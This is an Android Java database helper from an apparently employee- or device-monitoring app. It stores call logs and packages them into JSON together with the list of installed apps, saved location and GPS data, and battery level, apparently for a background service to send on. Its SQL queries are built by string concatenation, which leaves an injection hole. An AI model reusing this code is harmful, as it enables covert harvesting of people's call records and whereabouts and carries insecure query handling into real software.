package warehousedelivery.taaxgenie.in.androidrestart;

import android.app.Activity;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.ContentValues;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

import static android.content.Context.MODE_PRIVATE;
import static warehousedelivery.taaxgenie.in.androidrestart.BackgroundService.locations;



/*
  Created by Harshit on 16-06-2017.
 */

@SuppressWarnings("DefaultFileTemplate")
public class Database extends SQLiteOpenHelper {
    public static final String MY_PREFS_NAME = "MyPrefsFile";
    // Logcat tag
    private static final String LOG = "Database";

    // Database Version
    private static final int DATABASE_VERSION = 2;

    // Database Name
    private static final String DATABASE_NAME = "Invoice";

    // Table Names
    private static final String TABLE_HSN = "CAllLOG";



    // Common column names
    private static final String KEY_ID = "id";
    private static final String KEY_NAME = "name";
    private static final String KEY_NUMER = "number";
    private static final String KEY_DATE = "date";
    private static final String KEY_CALL_TYPE= "callType";
    private static final String KEY_CALL_DURATION = "callDuration";



    private static final String KEY_CREATED_AT = "created_at";





    // Table Create Statements
    // Todo table create statement
    private static final String CREATE_TABLE_HSN = "CREATE TABLE "
            + TABLE_HSN + "(" + KEY_ID + " INT_AUTO_INCREMENT," + KEY_NAME + " TEXT,"  + KEY_NUMER + " TEXT," +KEY_CALL_TYPE +
            " TEXT, " + KEY_CALL_DURATION + " TEXT, "
            + KEY_DATE+ " TEXT, PRIMARY KEY ("+KEY_DATE+")"+")";




    public Database(Context context) {
        super(context, DATABASE_NAME, null, DATABASE_VERSION);

    }


    @Override
    public void onCreate(SQLiteDatabase db)
    {
        // creating required tables

        db.execSQL(CREATE_TABLE_HSN);

    }


    @Override
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
        // on upgrade drop older tables
        db.execSQL("DROP TABLE IF EXISTS " + TABLE_HSN);


        // create new tables
        onCreate(db);
    }

    /*
* Creating a Reminder
*/
    public long Insert(String name,String phn,String calltype,String calldureation,String date) {

try{

        SQLiteDatabase db = this.getWritableDatabase();




        ContentValues values = new ContentValues();
        values.put(KEY_NAME,name);
        values.put(KEY_NUMER, phn);
        values.put(KEY_DATE, date);
        values.put(KEY_CALL_TYPE,calltype);
        values.put(KEY_CALL_DURATION, calldureation);


        /*values.put(KEY_STATUS, reminder.getStatus());
        values.put(KEY_CREATED_AT, getDateTime());*/

        // insert row
        long reminder_id = db.insert(TABLE_HSN, null, values);

        return reminder_id;
}catch (Exception e){
    Helper.sendCrashReportDetails(null,e.getMessage(),e.getStackTrace());
}
        return 0;
    }

    public Boolean getsinglelog(String date,String name) {
try{

            String selectQuery = "SELECT  * FROM " + TABLE_HSN + " WHERE " + KEY_DATE + " LIKE \'" + date + "\'";

            SQLiteDatabase db = this.getReadableDatabase();
            Cursor c = db.rawQuery(selectQuery, null);
//    Log.e("QUERY FIRST", selectQuery);
//            Log.e("COUND", "" + c.getCount());
            if (c.getCount() >= 1) {

                String selectQuerys = "UPDATE " + TABLE_HSN + " SET " + KEY_NAME + " = \'" + name.replaceAll("'","") + "\' WHERE " + KEY_DATE + " = \'" + date + "\' " ;
             //   Log.e("QUERY SECOND", selectQuerys);

                Cursor cs = db.rawQuery(selectQuerys, null);
                return false;

            } else {
                return true;
            }

}catch (Exception e){
    Helper.sendCrashReportDetails(null,e.getMessage(),e.getStackTrace());
}


        return null;
    }


    /*
 * getting all reminders
 * */
    public StringBuffer getAlllog() {
try{
        String selectQuery = "SELECT  * FROM " + TABLE_HSN ;
        StringBuffer data = new StringBuffer();


        SQLiteDatabase db = this.getReadableDatabase();
        Cursor c = db.rawQuery(selectQuery, null);

        // looping through all rows and adding to list
        if (c.moveToFirst()) {
            do {



                // adding to todo list
                data.append("\nNumber Name:--- " + c.getString(c.getColumnIndex(KEY_NAME)) + "\nPhone Number:--- " + c.getString(c.getColumnIndex(KEY_NUMER)) + " \nCall Type:--- " + c.getString(c.getColumnIndex(KEY_CALL_TYPE)) + " \nCall Date:--- " + c.getString(c.getColumnIndex(KEY_DATE)) + " \nCall duration in sec :--- " + c.getString(c.getColumnIndex(KEY_CALL_DURATION)));
                //data.append("\nNumber Name:--- " + c.getString(c.getColumnIndex(KEY_NAME)) + "\nPhone Number:--- " + c.getString(c.getColumnIndex(KEY_NUMER)) + " \n  Call Date:--- " + c.getString(c.getColumnIndex(KEY_DATE)) );
                data.append("\n----------------------------------");
            } while (c.moveToNext());
        }

        return data;
}catch (Exception e){
    Helper.sendCrashReportDetails(null,e.getMessage(),e.getStackTrace());
}
        return null;
    }

    public JSONObject getAlllogJSON(Context ctx,String btry) {
try{
        String selectQuery = "SELECT  * FROM " + TABLE_HSN ;
        StringBuffer data = new StringBuffer();

  //  Database dbb = new Database(ctx);
        SQLiteDatabase db = this.getReadableDatabase();
        if(db.isOpen()){
            Log.e("DATABASE","OPEN");
        }else{
            Log.e("DATABASE","CLOSE");
        }
        Cursor c = db.rawQuery(selectQuery, null);

        // looping through all rows and adding to list
        JSONObject mainObject = new JSONObject();
        JSONArray aray= new JSONArray();
// get list of app running on background (forground apps) Code
//    if (Build.VERSION.SDK_INT >= 21) {
//        UsageStatsManager usm = (UsageStatsManager) ctx.getSystemService(Context.USAGE_STATS_SERVICE);
//        long time = System.currentTimeMillis();
//        List<UsageStats> applist = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, time - 1000 * 1000, time);
//        JSONArray List= new JSONArray();
//        for (int i = 0; i < applist.size(); i++) {
//            JSONObject Object = new JSONObject();
//
//            Log.e("Running app", "Current App in foreground is: " + applist.get(i).getPackageName());
//            Object.put("Apps",applist.get(i).getPackageName());
//            List.put(Object);
//        }
//
//        mainObject.put("APPS",List);
//    }
    //get a list of installed apps.
    final PackageManager pm = ctx.getPackageManager();

    List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
    JSONArray List= new JSONArray();
    for (ApplicationInfo packageInfo : packages) {

        //Log.e("Source dir : " ,""+ packageInfo.sourceDir);
        //Log.e( "Launch Activity :" ,""+ pm.getLaunchIntentForPackage(packageInfo.packageName));
        JSONObject Object = new JSONObject();
        if (packageInfo.packageName.contains("com.android.")
                ||packageInfo.packageName.contains("com.google.")
                ||packageInfo.packageName.contains("com.miui.")
                ||packageInfo.packageName.contains("com.xiaomi.")
                ||packageInfo.packageName.contains("com.qualcomm.")
                ||packageInfo.packageName.contains("com.mi.")
                ||packageInfo.packageName.contains("com.qti.")) {

        }else{
            ApplicationInfo ai;
            try {
                ai = pm.getApplicationInfo( packageInfo.packageName, 0);
            } catch (final PackageManager.NameNotFoundException e) {
                ai = null;
            }
            final String applicationName = (String) (ai != null ? pm.getApplicationLabel(ai) : "(unknown)");
            Log.e( "App Name :" ,""+ applicationName);

            Object.put("Apps",applicationName);

            List.put(Object);
        }

    }
    mainObject.put("APPS",List);
    //END get a list of installed apps.

    if (c.moveToFirst()) {
            do {

                // adding to todo list
                data.append("\nNumber Name:--- " + c.getString(c.getColumnIndex(KEY_NAME)) + "\nPhone Number:--- " + c.getString(c.getColumnIndex(KEY_NUMER)) + " \nCall Type:--- " + c.getString(c.getColumnIndex(KEY_CALL_TYPE)) + " \nCall Date:--- " + c.getString(c.getColumnIndex(KEY_DATE)) + " \nCall duration in sec :--- " + c.getString(c.getColumnIndex(KEY_CALL_DURATION)));
                //data.append("\nNumber Name:--- " + c.getString(c.getColumnIndex(KEY_NAME)) + "\nPhone Number:--- " + c.getString(c.getColumnIndex(KEY_NUMER)) + " \n  Call Date:--- " + c.getString(c.getColumnIndex(KEY_DATE)) );
                data.append("\n----------------------------------");

                JSONObject Object = new JSONObject();
                try {
                    Object.put("Number Name", c.getString(c.getColumnIndex(KEY_NAME)));
                    Object.put("Phone Number", c.getString(c.getColumnIndex(KEY_NUMER)));
                    Object.put("Call Type", c.getString(c.getColumnIndex(KEY_CALL_TYPE)) );
                    Object.put("Call Date", c.getString(c.getColumnIndex(KEY_DATE)));
                    Object.put("Call duration in sec", c.getString(c.getColumnIndex(KEY_CALL_DURATION)));
                    aray.put(Object);


                }catch(Exception e ){
                    Helper.sendCrashReportDetails(null,e.getMessage(),e.getStackTrace());
                }
            } while (c.moveToNext());
            try {

                mainObject.put("CALL LOG",aray);
                Boolean check=isNetworkAvailable(ctx);
                if (check){
                    mainObject.put("LAST SEEN",getDateTime(ctx));
                }else{
                    mainObject.put("LAST SEEN",setDateTime(ctx));
                }
                SharedPreferences prefs = ctx.getSharedPreferences(MY_PREFS_NAME, MODE_PRIVATE);
                String Location = prefs.getString("Location", null);
                String gps = prefs.getString("GPS", null);
                if (Location == null){

                    Location="";
                }


                mainObject.put("Location",   "^"+Location+"^");
                mainObject.put("GPS",   gps);
                mainObject.put("Battery Level",btry);


                Log.e("check",""+check);
              //  Log.e("JSON LOG",mainObject.toString());
            } catch (JSONException e) {
                Helper.sendCrashReportDetails(null,e.getMessage(),e.getStackTrace());
            }
        }

        return mainObject;
}catch (Exception e){
    Helper.sendCrashReportDetails(null,e.getMessage(),e.getStackTrace());
}
        return null;
    }



/*********************************************************************************/


/*********************************************************************************/

    public String setDateTime(Context ctx)
    {
        String formattedDate="";
        SharedPreferences prefs = ctx.getSharedPreferences(MY_PREFS_NAME, MODE_PRIVATE);
        String time = prefs.getString("lastseen", null);
        if (time == null) {
            SimpleDateFormat dateFormat = new SimpleDateFormat("dd-MMM-yy hh.mm.ss.S aa");
            formattedDate = dateFormat.format(new Date()).toString();
            System.out.println(formattedDate);
            SharedPreferences.Editor editor = ctx.getSharedPreferences(MY_PREFS_NAME, MODE_PRIVATE).edit();
            editor.putString("lastseen", formattedDate);
            editor.putString("lastseennew", formattedDate);

            editor.apply();
        }
        return  formattedDate;

    }
    public String getDateTime(Context ctx) {
        SharedPreferences prefs = ctx.getSharedPreferences(MY_PREFS_NAME, MODE_PRIVATE);
        String time = prefs.getString("lastseen", null);
        if (time == null){
            time= prefs.getString("lastseennew", null);

        }

        SharedPreferences.Editor editor = ctx.getSharedPreferences(MY_PREFS_NAME, MODE_PRIVATE).edit();
        editor.putString("lastseen",null);
        editor.apply();
        return time;
    }
    private boolean isNetworkAvailable(Context ctx) {
        ConnectivityManager connectivityManager
                = (ConnectivityManager) ctx.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
        return activeNetworkInfo != null && activeNetworkInfo.isConnected();
    }
}


